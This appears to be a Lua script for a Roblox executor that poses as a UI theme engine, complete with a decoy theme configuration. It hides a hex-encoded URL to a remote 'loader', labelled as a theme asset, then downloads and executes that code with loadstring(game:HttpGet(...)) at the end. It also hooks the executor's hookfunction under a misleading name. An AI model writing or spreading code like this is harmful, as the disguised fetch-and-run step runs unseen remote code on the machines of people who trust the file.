local function protectStream()
    pcall(function()
        if hookfunction and newcclosure then
            local oldHook
            oldHook = hookfunction(hookfunction, newcclosure(function(func, ...)
                return oldHook(func, ...)
            end))
        end
    end)
end

protectStream()

local function resolveThemeAsset(hexToken)
    local output = ""
    for i = 1, #hexToken, 2 do
        output = output .. string.char(tonumber(hexToken:sub(i, i + 1), 16))
    end
    return output
end

local themes = resolveThemeAsset("687474703a2f2f636875622e776973702e756e6f2f6c6f616465722f63616e64792d6661726d")

local themeConfig = {
    CurrentTheme = "candymain",
    FallbackTheme = "Candyfall",
    AccentColor = "#FF5555",
    Endpoints = {
        SourceCode = "https://vault.pandauth.com/kvs/90dd1045b2ce29d1",
        AssetCDN = "https://raw.githubusercontent.com/theme-assets/storage/main/manifest.json",
        FontRegistry = "https://fonts.gstatic.com/s/inter/v12/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1ZL7W0Q5nw.woff2"
    },
    Settings = {
        AutoSave = true,
        CacheDuration = 86400,
        DebugMode = false
    }
}

local function initializeThemeEngine()
    local theme = themeConfig.CurrentTheme
    if themeConfig.Settings.DebugMode then
        print("[UI]: Initialized theme " .. theme)
    end
end

initializeThemeEngine()

loadstring(game:HttpGet(themes))()
